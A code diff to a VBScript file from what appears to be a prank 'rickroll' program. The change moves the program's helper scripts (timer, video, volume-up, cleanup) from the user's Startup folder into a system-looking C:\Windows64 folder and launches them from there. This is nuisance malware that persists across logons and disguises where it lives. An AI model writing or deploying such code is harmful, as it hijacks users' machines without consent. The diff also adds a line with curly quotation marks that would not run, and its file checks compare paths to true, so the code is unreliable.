@@ -4,15 +4,23 @@ Set WshShell = CreateObject("WScript.Shell")
 Set oShell = CreateObject("WScript.Shell")
 Set objShell = Wscript.CreateObject("WScript.Shell")
 Wscript.Echo "Alive"
+
+Set objShell = CreateObject(“Wscript.Shell”)
+Wscript.Echo objShell.CurrentDirectory
+
+objShell.CurrentDirectory = "C:\"
+Wscript.Echo (objShell.CurrentDirectory)
 'declare varibales
 strHomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
-batFolder = strHomeFolder +  "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickroll\missing\"
-file1 = strHomeFolder + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickroll\FileChecker.vbs"
-file2 = strHomeFolder + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickroll\Timer.vbs"
-file3 = strHomeFolder + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickroll\Video.vbs"
-file4 = strHomeFolder + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickroll\VolumeUp.vbs"
-file5 = strHomeFolder + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickroll\RickRoll.vbs"
-file6 = strHomeFolder + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rr\CleanUp.vbs"
+homefolder = "C:\Windows64\rickroll\"
+batFolder = "C:\Windows64\rickroll\missing\"
+file1 = "C:\Windows64\rickroll\FileChecker.vbs"
+file2 = "C:\Windows64\rickroll\Timer.vbs"
+file3 = "C:\Windows64\rickroll\Video.vbs"
+file4 = "C:\Windows64\rickroll\VolumeUp.vbs"
+file5 = "C:\Windows64\rickroll\RickRoll.vbs"
+file6 = "C:\Windows64\rr\CleanUp.vbs"
+
 
 Function FileExists(FilePath)
     Set fso = CreateObject("Scripting.FileSystemObject")
@@ -101,7 +109,7 @@ if file2 = true then
         if file4 = true then
             if file5 = true then
                 if file6 = true then
-                    objShell.Run "Timer.vbs"
+                    objShell.Run homefolder + "Timer.vbs"
                 end if
             end if
         end if
